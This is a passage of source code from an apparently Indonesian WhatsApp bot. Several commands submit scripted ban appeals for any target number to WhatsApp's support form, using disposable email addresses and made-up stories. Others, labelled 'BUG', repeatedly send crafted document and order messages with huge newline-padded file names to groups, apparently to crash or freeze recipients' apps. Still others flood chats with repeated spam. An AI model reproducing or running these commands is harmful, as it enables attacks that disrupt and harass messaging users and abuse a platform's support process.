Sistem kami menandai aktivitas akun Anda sebagai pelanggaran terhadap Ketentuan Layanan kami dan memblokir nomor telepon Anda. Kami sangat menghargai Anda sebagai pengguna. Mohon maaf atas kebingungan atau ketidaknyamanan yang disebabkan oleh masalah ini.

Kami telah menghapus pemblokiran setelah meninjau aktivitas akun Anda. Sekarang seharusnya Anda sudah memiliki akses ke WhatsApp.

Sebagai langkah selanjutnya, kami sarankan untuk mendaftarkan ulang nomor telepon Anda di WhatsApp untuk memastikan Anda memiliki akses. Anda dapat mengunjungi situs web kami untuk

mengunduh WhatsApp atau aplikasi WhatsApp Business.`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor target!')
}
break
//=================================================
case 'unbannedv2': {
if (!isCreator) return
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return reply(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=199999999999999999995777678776668876677777")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Pihak WhatsApp yang terhormat mohon bantuan anda segera
[${targetnya}]
Saya telah mengirim beberapa email dan laporan ke pihak WhatsApp untuk mengajukan banding agar nomor saya cepat di buka dari daftar blokir, saya sangat membutuhkan untuk keperluan pribadi berkomunikasi dengan keluarga jika saya melakukan pelanggaran sebelumnya maka saya akan menggunakan nomor saya tersebut dengan lebih hati-hati dan lebih baik lagi dari sebelumnya dan saya sekarang telah menuruti apa yang pihak WhatsApp sarankan, dan saya sangat berharap sekarang juga nomor saya dapat di gunakan kembali. Terimakasih`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
reply(`Wait 1-24 Jam an untuk proses unbanned dari bot dan tunggu ±30 Detik an untuk melihat balasan email dari WhatsApp tuan Hw Mods🥺🙏`)
await sleep(90000)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##

Halo,

Terima kasih telah menghubungi kami.

Sistem kami menandai aktivitas akun Anda sebagai pelanggaran terhadap Ketentuan Layanan kami dan memblokir nomor telepon Anda. Kami sangat menghargai Anda sebagai pengguna. Mohon maaf atas kebingungan atau ketidaknyamanan yang disebabkan oleh masalah ini.

Kami telah menghapus pemblokiran setelah meninjau aktivitas akun Anda. Sekarang seharusnya Anda sudah memiliki akses ke WhatsApp.

Sebagai langkah selanjutnya, kami sarankan untuk mendaftarkan ulang nomor telepon Anda di WhatsApp untuk memastikan Anda memiliki akses. Anda dapat mengunjungi situs web kami untuk

mengunduh WhatsApp atau aplikasi WhatsApp Business.`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor target!')
}
break
//=================================================
case 'unbannedv3': {
if (!isCreator) return
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return reply(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=199999999999999999995777678776668876677777")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Hola WhatsApp
Actualmente, algunas personas tienen muchas formas efectivas de bloquear números de usuario e informarlos sin ningún motivo, de hecho, conozco bien los términos de servicio y los cumplí, pero algunos piratas informáticos me hicieron un informe falso y mi número fue bloqueado, desbloquee el número ${targetnya}`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
reply(`Wait 1-24 Jam an untuk proses unbanned dari bot dan tunggu ±30 Detik an untuk melihat balasan email dari WhatsApp tuan Hw Mods🥺🙏`)
await sleep(90000)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##

Halo,

Terima kasih telah menghubungi kami.

Sistem kami menandai aktivitas akun Anda sebagai pelanggaran terhadap Ketentuan Layanan kami dan memblokir nomor telepon Anda. Kami sangat menghargai Anda sebagai pengguna. Mohon maaf atas kebingungan atau ketidaknyamanan yang disebabkan oleh masalah ini.

Kami telah menghapus pemblokiran setelah meninjau aktivitas akun Anda. Sekarang seharusnya Anda sudah memiliki akses ke WhatsApp.

Sebagai langkah selanjutnya, kami sarankan untuk mendaftarkan ulang nomor telepon Anda di WhatsApp untuk memastikan Anda memiliki akses. Anda dapat mengunjungi situs web kami untuk

mengunduh WhatsApp atau aplikasi WhatsApp Business.`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor target!')
}
break
//=================================================
case 'unbannedv4': {
if (!isCreator) return
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return reply(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=199999999999999999995777678776668876677777")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Good day whatsApp team. My whatApp account has been burned permanently, please i plead with you unblock it, i cannot use another number again. I don’t know why it is burned but my friends re suggesting its because i use GB whatsApp, which i didn’t know it was wrong. My number is [ ${targetnya} ]. Please whatsApp team, help me unblock my account. please i cannot use a new number as my current number is connected to slot of important things like vacancies.
Thank you`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
reply(`Wait 1-24 Jam an untuk proses unbanned dari bot dan tunggu ±30 Detik an untuk melihat balasan email dari WhatsApp tuan Hw Mods🥺🙏`)
await sleep(90000)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##

Halo,

Terima kasih telah menghubungi kami.

Sistem kami menandai aktivitas akun Anda sebagai pelanggaran terhadap Ketentuan Layanan kami dan memblokir nomor telepon Anda. Kami sangat menghargai Anda sebagai pengguna. Mohon maaf atas kebingungan atau ketidaknyamanan yang disebabkan oleh masalah ini.

Kami telah menghapus pemblokiran setelah meninjau aktivitas akun Anda. Sekarang seharusnya Anda sudah memiliki akses ke WhatsApp.

Sebagai langkah selanjutnya, kami sarankan untuk mendaftarkan ulang nomor telepon Anda di WhatsApp untuk memastikan Anda memiliki akses. Anda dapat mengunjungi situs web kami untuk

mengunduh WhatsApp atau aplikasi WhatsApp Business.`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor target!')
}
break
//=================================================
case 'unbannedv5': {
if (!isCreator) return
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return reply(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=199999999999999999995777678776668876677777")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Aloha WhatsApp, ua ʻaihue ʻia kaʻu helu e ka mea hacker, e ʻoluʻolu e wehe hou iā ia [${targetnya}]`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
reply(`Wait 1-24 Jam an untuk proses unbanned dari bot dan tunggu ±30 Detik an untuk melihat balasan email dari WhatsApp tuan Hw Mods🥺🙏`)
await sleep(90000)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##

Halo,

Terima kasih telah menghubungi kami.

Sistem kami menandai aktivitas akun Anda sebagai pelanggaran terhadap Ketentuan Layanan kami dan memblokir nomor telepon Anda. Kami sangat menghargai Anda sebagai pengguna. Mohon maaf atas kebingungan atau ketidaknyamanan yang disebabkan oleh masalah ini.

Kami telah menghapus pemblokiran setelah meninjau aktivitas akun Anda. Sekarang seharusnya Anda sudah memiliki akses ke WhatsApp.

Sebagai langkah selanjutnya, kami sarankan untuk mendaftarkan ulang nomor telepon Anda di WhatsApp untuk memastikan Anda memiliki akses. Anda dapat mengunjungi situs web kami untuk

mengunduh WhatsApp atau aplikasi WhatsApp Business.`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor target!')
}
break
//=================================================
case 'openai':
if (!isCreator) return m.reply(`*khusus Premium*`) 
 try {
if (global.keyopenai === '') return reply("Apikey belum diisi\n\nSilahkan isi terlebih dahulu apikeynya di file config.js\n\nApikeynya bisa dibuat di website: https://beta.openai.com/account/api-keys");
if (!text) return reply(`Chat dengan AI.\n\nContoh:\n${comand} Apa itu coding`)
const configuration = new Configuration({
apiKey: global.keyopenai,
});
const openai = new OpenAIApi(configuration);
const response = await openai.createCompletion({
model: "text-davinci-003",
prompt: text,
temperature: 0, // Nilai yang lebih tinggi berarti model akan mengambil lebih banyak risiko.
max_tokens: 2048, // Jumlah maksimum token yang dihasilkan dalam penyelesaian. Sebagian besar model memiliki panjang konteks 2048 token (kecuali untuk model terbaru, yang mendukung 4096).
top_p: 1, // alternatif untuk pengambilan sampel dengan suhu, disebut pengambilan sampel nukleus
frequency_penalty: 0.3, // Angka antara -2.0 dan 2.0. Nilai positif menghukum token baru berdasarkan frekuensi yang ada dalam teks sejauh ini, mengurangi kemungkinan model untuk mengulang baris yang sama kata demi kata.
presence_penalty: 0 // Angka antara -2.0 dan 2.0. Nilai positif menghukum token baru berdasarkan apakah mereka muncul dalam teks sejauh ini, meningkatkan kemungkinan model untuk membicarakan topik baru.
});
reply(`${response.data.choices[0].text}`);
} catch (error) {
if (error.response) {
console.log(error.response.status);
console.log(error.response.data);
console.log(`${error.response.status}\n\n${error.response.data}`);
} else {
console.log(error);
reply("Maaf, sepertinya ada yang error :"+ error.message);
}
}
break
//=================================================
case 'bug': case 'apa': case 'kenapa': case 'oke': case 'bug': case 'apa':{
  haikal.sendMessage(from, {
    'text': 'Iya'
  }, {
    'quoted': kalgans
  })
  }
  break
  //=================================================
case 'docugc': {
if (!isCreator) return m.reply(`*khusus Premium*`)
if (args.length < 1) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
bnnd = text.split("|")[0]+'@g.us'
jumlah = "15"
for (let i = 0; i < jumlah; i++) {
var document = generateWAMessageFromContent(from, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AjZ6wydBPTW9LotpjZK5gSstbxj0L_B2sCeSm-JWLPPS.enc",
"mimetype": "",
"title": "𝗕𝗔𝗦𝗘 𝗦𝗜𝗗",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"pageCount": 0,
"mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
"fileName": `ZENN MODS WA⏧☆⏧ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`,
"fileEncSha256": "CnBDLUVshNEAmK8C4ShVaI99hh/oFBEZHIeGsL/Q3HY=",
"directPath": "/v/t62.7119-24/19245462_2210838589082189_6252828231656384414_n.enc?ccb=11-4&oh=01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g&oe=6303EB20",
"mediaKeyTimestamp": "1658703206",
"caption":` ZENN MODS WA ${buttonkal}`,
}
}), { userJid: from, quoted:kalgans})
haikal.relayMessage(bnnd, document.message, { messageId: document.key.id })
}
}
break
//=================================================//
case 'troligc': {
if (!isCreator) return m.reply(`*khusus Premium*`)
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
bnnd = text.split("|")[0]+'@g.us'
jumlah = "15"
for (let i = 0; i < jumlah; i++) {
let dok = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `© ${ownername}`,jpegThumbnail: thumb}}}
var order = generateWAMessageFromContent(from, proto.Message.fromObject({
"orderMessage": {
"orderId": "599519108102353",
"thumbnail": virgam,
"itemCount": 1999,
"status": "INQUIRY",
"surface": "CATALOG",
"message": 'ZENN MODS WA',
"orderTitle": " BUG TROLI ", // 
"sellerJid": "6281214281312@s.whatsapp.net",
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
}
}), { userJid: from, quoted : kalgans})
haikal.relayMessage(bnnd, order.message, { messageId: order.key.id })
}
}
break
//=================================================//
// BUG OWNER
 case 'santetgc' : {
 if (!isCreator) return m.reply(`*khusus Premium*`)
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@g.us"
haikal.sendMessage(Pe, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(Pe, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(Pe, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(Pe, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(Pe, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(Pe, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(Pe, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(Pe, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(Pe, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(Pe, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(Pe, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(Pe, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(Pe, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(Pe, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(Pe, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(Pe, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(Pe, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(Pe, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(Pe, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(Pe, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(Pe, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(Pe, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(Pe, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(Pe, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(Pe, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(Pe, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(Pe, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(Pe, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(Pe, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(Pe, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(Pe, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(Pe, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
}
break
//=================================================//
 case 'unlitet' : case '🌷' : case '🐲': case '🐉': case '🌵': case '🎄': case '🌲': case '🌳': case '🌱': case '🌿': case '🍀': case '☘️':  {
if (!isCreator) return m.reply(`*khusus Premium*`)
haikal.sendMessage(from, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(from, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(from, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(from, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(from, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(from, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(from, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(from, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(from, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(from, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(from, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(from, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(from, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(from, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(from, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(from, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(from, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(from, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(from, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(from, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(from, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(from, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(from, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(from, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(from, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(from, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(from, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(from, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(from, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(from, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(from, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(from, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(from, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(from, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(from, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(from, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(from, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(from, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(from, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(from, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(from, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(from, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(from, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(from, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(from, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(from, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(from, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(from, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
}
break
//=================================================//
case 'unlidocu': {
if (!isCreator) return m.reply(`*khusus Premium*`)
jumlah = "15"
for (let i = 0; i < jumlah; i++) {
var document = generateWAMessageFromContent(from, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AjZ6wydBPTW9LotpjZK5gSstbxj0L_B2sCeSm-JWLPPS.enc",
"mimetype": "",
"title": "𝗕𝗔𝗦𝗘 𝗦𝗜𝗗",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"pageCount": 0,
"mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
"fileName": `ZENN MODS WA⏧☆⏧ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\